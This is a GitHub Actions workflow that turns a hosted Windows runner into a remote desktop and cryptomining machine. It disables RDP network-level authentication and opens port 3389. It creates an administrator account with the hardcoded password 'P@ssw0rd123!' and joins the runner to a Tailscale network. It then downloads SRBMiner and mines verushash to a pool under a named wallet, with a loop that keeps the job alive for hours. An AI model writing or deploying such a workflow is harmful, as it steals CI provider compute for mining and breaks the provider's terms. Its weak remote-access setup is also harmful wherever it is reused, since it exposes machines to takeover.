name: System-RDP-Compute
on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall add rule name="RDP-Port" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User
        run: |
          $password = "P@ssw0rd123!" # You can use your random generator here
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          echo "TAILSCALE_IP=Pending" >> $env:GITHUB_ENV

      - name: Install & Connect Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          Invoke-WebRequest -Uri $tsUrl -OutFile "ts.msi"
          Start-Process msiexec.exe -ArgumentList "/i", "ts.msi", "/quiet", "/norestart" -Wait
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-windows-$env:GITHUB_RUN_ID
          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV

      - name: Download and Setup SRBMiner
        run: |
          # Fresh download of Windows 64-bit version
          $url = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-win64.zip"
          Invoke-WebRequest -Uri $url -OutFile "miner.zip"
          Expand-Archive -Path "miner.zip" -DestinationPath "."
          
          # Move binary to a simple folder name
          mv SRBMiner-Multi-2-4-7 miner_files

      - name: Create and Run start.bat
        run: |
          cd miner_files
          
          # Creating the start.bat file exactly as requested
          $batContent = @"
          @echo off
          SRBMiner-MULTI.exe --algorithm verushash --pool na.luckpool.net:3956 --wallet RRA93CzekuvN6aNV4PBknt87YS6L26mrVD --password x --cpu-threads 0 --disable-gpu
          pause
          "@
          
          $batContent | Out-File -FilePath "start.bat" -Encoding ascii
          
          # Start the miner in a new background process so the workflow continues
          Start-Process -FilePath "cmd.exe" -ArgumentList "/c start.bat" -WorkingDirectory "miner_files"

      - name: Maintain RDP Session
        run: |
          Write-Host "RDP is Ready!"
          Write-Host "Address: $env:TAILSCALE_IP"
          Write-Host "User: RDP"
          
          # Keep-alive loop to maintain the 6-hour+ session
          while ($true) {
              Write-Host "[$(Get-Date)] Session Active. Miner running in background..."
              Start-Sleep -Seconds 300
          }
